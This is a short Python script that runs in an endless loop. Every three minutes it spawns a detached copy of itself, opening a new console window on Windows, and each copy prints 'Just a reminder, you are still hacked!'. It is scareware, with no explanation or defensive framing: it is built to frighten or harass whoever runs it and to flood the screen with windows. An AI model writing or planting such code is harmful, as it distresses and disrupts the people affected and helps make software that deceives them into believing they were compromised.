import os
import sys
import subprocess
import time

current_direc = os.path.dirname(os.path.abspath(__file__))


def launch_detached_process(func_name):

    env = os.environ.copy()
    env["PYINSTALLER_RESET_ENVIRONMENT"] = "1"

    kwargs = {
        "cwd": current_direc,
        "env": env,
        "close_fds": True,
    }

    if os.name == "nt":
        kwargs["creationflags"] = subprocess.CREATE_NEW_CONSOLE

    subprocess.Popen(
        [
            sys.executable,
            "--run-function",
            os.path.abspath(__file__),
            func_name
        ],
        **kwargs
    )


def infinite_reminder():
    print("Just a reminder, you are still hacked!", flush=True)
    time.sleep(30)


if __name__ == "__main__":
    while True:
        time.sleep(60 * 3)
        launch_detached_process("infinite_reminder")
